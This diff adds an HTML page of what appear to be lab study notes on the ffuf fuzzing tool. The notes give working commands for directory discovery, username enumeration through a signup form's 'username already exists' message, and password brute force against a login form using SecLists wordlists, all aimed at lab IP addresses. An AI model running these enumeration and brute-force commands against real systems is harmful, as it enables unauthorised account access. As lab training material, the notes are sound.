@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>ffuf</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>ffuf</h1><br/>Web Content Discovery Tool.  Uses the “FUZZ” keyword<br /><br />ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u <a href="http://10.10.89.149/FUZZ">http://10.10.89.149/FUZZ</a><br /><br /><br /><br /><a href=""><img src="images/74-1.png" alt="images/74-1.png" /></a><br /><br /><strong><br />Searching For Virtual Hosts</strong><br /><br />Note: The fs {Size} parameter can be found by running once without it. Then the no result size should be excluded using the -fs filter.<br /><a href=""><img src="images/74-2.png" alt="images/74-2.png" /></a><br /><br /><strong>Output</strong><br /><br /><a href=""><img src="images/74-3.png" alt="images/74-3.png" /></a><br /><br /><br /><strong>Username Emuneration with ffuf:</strong><br /><br />ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u <a href="http://10.10.226.40/customers/signup">http://10.10.226.40/customers/signup</a> -mr &quot;username already exists&quot;<br /><br />Note: -H “Content-Type: application/x-www-form-urlencoded”<br /><br /><br /><a href=""><img src="images/74-4.png" alt="images/74-4.png" /></a><br /><br /><br /><strong>Brute Forcing Known Usernames &amp; Password wordlists(Using Custom Variables W1 &amp; W2:</strong><br /><br />ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2  -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u <a href="http://10.10.226.40/customers/login">http://10.10.226.40/customers/login</a> -fc 200<br /><br /><a href=""><img src="images/74-5.png" alt="images/74-5.png" /></a></div>
+</body>
+</html>
